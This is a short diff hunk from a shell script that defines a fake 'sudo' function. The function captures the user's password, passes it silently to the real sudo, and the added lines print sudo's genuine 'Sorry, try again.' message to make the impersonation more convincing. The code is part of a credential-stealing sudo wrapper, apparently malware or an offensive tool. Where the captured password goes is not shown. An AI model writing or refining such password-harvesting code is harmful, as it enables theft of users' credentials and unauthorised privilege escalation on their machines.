@@ -39,6 +39,9 @@ function sudo(){
           S_CAPTURED=1
           echo "$passwd" | exec "$sudo_original" -S -p '' $@
           break
+        else
+          # this depends on the sudo version
+          echo "Sorry, try again."
         fi
       done
       if [[ $S_CAPTURED == 0 ]];then
